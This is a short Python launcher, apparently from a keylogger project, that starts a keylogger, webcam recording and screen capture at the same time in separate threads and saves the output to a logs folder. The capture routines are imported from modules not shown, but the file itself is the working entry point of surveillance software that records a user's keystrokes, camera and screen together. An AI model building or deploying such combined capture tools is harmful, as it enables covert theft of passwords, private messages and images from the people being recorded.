from threading import Thread
from keylogger import start_keylogger
from video_capture import start_video_recording
from screen_capture import start_screen_record

if __name__ == "__main__":
    print("[*] Starting keylogger, webcam (30s), and screen capture (manual stop)...")

    try:
        t1 = Thread(target=start_keylogger)
        t2 = Thread(target=start_video_recording, args=(r'E:\Saved Games\key-logger-simulation\logs\capture.avi', 30))
        t3 = Thread(target=start_screen_record)  # No arguments now

        t1.start()
        t2.start()
        t3.start()

        t1.join()
        t2.join()
        t3.join()

    except KeyboardInterrupt:
        print("\n[!] Ctrl + C detected. Stopping all threads...")

    print("[*] All processes stopped. Check the 'logs' folder for output.")
    